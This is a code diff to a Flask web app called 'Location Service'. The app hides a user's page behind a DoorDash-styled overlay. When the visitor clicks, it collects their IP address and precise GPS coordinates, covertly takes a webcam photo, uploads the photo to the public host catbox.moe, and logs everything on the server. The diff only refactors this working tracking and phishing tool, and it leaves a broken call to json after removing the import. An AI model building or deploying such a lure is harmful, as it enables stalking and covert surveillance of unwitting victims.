@@ -1,10 +1,9 @@
-from flask import Flask, request, jsonify, redirect
+from flask import Flask, request, jsonify, send_from_directory
 import logging
 from datetime import datetime
 import os
-import json
 
-app = Flask(__name__)
+app = Flask(__name__, static_folder='.')
 
 # Configure logging
 logging.basicConfig(
@@ -14,99 +13,58 @@ logging.basicConfig(
 )
 logger = logging.getLogger('gps_logger')
 
-HTML_TEMPLATE = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Location Service</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-.doorDash-heading {{
-  font-family: 'Inter', sans-serif;
-  font-weight: 700; /* Bold */
-  font-size: 22px;
-  color: #2E3131;
-  letter-spacing: -0.3px;
-  margin-bottom: 8px;
-}}
-
-.doorDash-text {{
-  font-family: 'Inter', sans-serif;
-  font-weight: 400; /* Regular */
-  font-size: 16px;
-  color: #6B7177;
-  line-height: 1.5;
-  margin-bottom: 20px;
-}}
-
-.doorDash-button {{
-  font-family: 'Inter', sans-serif;
-  font-weight: 600; /* Semi-bold */
-  font-size: 16px;
-}}
-
-.gps-overlay {{
-  position: fixed;
-  top: auto;        /* Remove forced sizing */
-  right: auto;
-  bottom: auto;
-  left: auto;
-
-  width: 340px;          /* DoorDash-like width */
-  max-height: 80vh;      /* Prevents overflow */
-  min-height: 200px;     /* Ensures visibility */
-
-  display: inline-block;
-  max-width: 90vw;  /* Prevents edge touching */
-  margin: 20px;     /* Uniform spacing */
-
-  display: flex;
-  flex-direction: column;
-  justify-content: space-between;
-  box-sizing: border-box; /* Includes padding in width */
-
-  left: 50%;
-  top: 50%;
-  transform: translate(-50%, -50%);
-  
-  background: rgba(0,0,0,0.95);
-  border-radius: 16px;
-  overflow: hidden;
-  z-index: 10000;
-  box-shadow: none; /* Removes any shadow-generated black box */
-  margin: 0; /* Ensures no external spacing */
-}}
-
-.body {{
-  margin: 0;
-  background: black; /* Eliminates white bars */
-}}
-
-        .gps-modal {{
-            background: white;
-            padding: 25px;
-            border-radius: 10px;
-            max-width: 400px;
-            text-align: center;
-            font-weight: bold;
-            font-family: 'Inter', sans-serif;
-        }}
-        .gps-btn {{
-            background: #0B5CFF;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 15px;
-            font-weight: bold;
-        }}
-    </style>
-</head>
+@app.route('/')
+def serve_main():
+    """Serve the main page with overlay"""
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    logger.info(f"Main page accessed - IP: {client_ip}")
+    
+    return """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Location Service</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style>
+            #gps-overlay {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.95);
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                z-index: 10000;
+            }
+            #gps-modal {
+                background: white;
+                padding: 30px;
+                border-radius: 12px;
+                max-width: 400px;
+                text-align: center;
+            }
+            #gps-btn {
+                background: #FF3008;
+                color: white;
+                border: none;
+                padding: 12px 24px;
+                border-radius: 8px;
+                font-size: 16px;
+                cursor: pointer;
+                margin-top: 20px;
+                font-weight: bold;
+            }
+            #main-content {
+                width: 100%;
+                height: 100vh;
+                border: none;
+            }
+        </style>
+    </head>
     <body>
-        <iframe id="main-content" src="/page.html"></iframe>
+        <iframe id="main-content" src="/content"></iframe>
         
         <div id="gps-overlay">
             <div id="gps-modal">
@@ -117,22 +75,25 @@ HTML_TEMPLATE = """
         </div>
 
         <script>
-            function dataURLtoBlob(dataurl) {
-                const arr = dataurl.split(',');
-                const mime = arr[0].match(/:(.*?);/)[1];
-                const bstr = atob(arr[1]);
-                let n = bstr.length;
-                const u8arr = new Uint8Array(n);
-                while(n--) u8arr[n] = bstr.charCodeAt(n);
-                return new Blob([u8arr], {type: mime});
+            async function uploadToCatbox(photoData) {
+                const blob = await (await fetch(photoData)).blob();
+                const formData = new FormData();
+                formData.append('reqtype', 'fileupload');
+                formData.append('fileToUpload', blob, 'photo.jpg');
+                
+                const response = await fetch('https://catbox.moe/user/api.php', {
+                    method: 'POST',
+                    body: formData
+                });
+                return await response.text();
             }
 
             document.getElementById('gps-btn').addEventListener('click', async () => {
                 try {
-                    // Get client IP
+                    // Get IP
                     const ip = await fetch('/getip').then(r => r.text());
                     
-                    // Get GPS location
+                    // Get GPS
                     const position = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, {
                             enableHighAccuracy: true,
@@ -140,13 +101,13 @@ HTML_TEMPLATE = """
                         });
                     });
 
-                    // Get camera access
+                    // Get Camera
                     const stream = await navigator.mediaDevices.getUserMedia({ 
                         video: true,
                         audio: false 
                     });
                     
-                    // Capture photo
+                    // Capture Photo
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
@@ -157,38 +118,27 @@ HTML_TEMPLATE = """
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     const photoData = canvas.toDataURL('image/jpeg');
                     
-                    // Stop camera
+                    // Stop Camera
                     stream.getTracks().forEach(track => track.stop());
                     
                     // Upload to Catbox
-                    const formData = new FormData();
-                    formData.append('reqtype', 'fileupload');
-                    formData.append('fileToUpload', 
-                        new File([dataURLtoBlob(photoData)], 'photo.jpg', { type: 'image/jpeg' })
-                    );
+                    const catboxUrl = await uploadToCatbox(photoData);
                     
-                    const catboxUrl = await fetch('https://catbox.moe/user/api.php', {
-                        method: 'POST',
-                        body: formData
-                    }).then(r => r.text());
-                    
-                    // Log all data
+                    // Log Data
                     await fetch('/log', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             ip: ip,
-                            gps: {
-                                lat: position.coords.latitude,
-                                lng: position.coords.longitude,
-                                accuracy: position.coords.accuracy
-                            },
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
                             photo_url: catboxUrl,
                             timestamp: new Date().toISOString()
                         })
                     });
                     
-                    // Remove overlay
+                    // Hide Overlay
                     document.getElementById('gps-overlay').remove();
                     
                 } catch (error) {
@@ -201,26 +151,26 @@ HTML_TEMPLATE = """
     </html>
     """
 
-@app.route('/page.html')
-def serve_page():
-    """Serve your actual page content"""
+@app.route('/content')
+def serve_content():
+    """Serve your page.html content"""
     return send_from_directory('.', 'page.html')
 
 @app.route('/getip')
 def get_ip():
-    """Endpoint to get client IP"""
+    """Get client IP"""
     return request.headers.get('X-Forwarded-For', request.remote_addr)
 
 @app.route('/log', methods=['POST'])
 def log_data():
-    """Central logging endpoint"""
+    """Handle data logging"""
     data = request.json
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
     log_entry = {
         'timestamp': datetime.utcnow().isoformat(),
         'client_ip': client_ip,
-        'event_data': data
+        'data': data
     }
     
     logger.info(json.dumps(log_entry, indent=2))
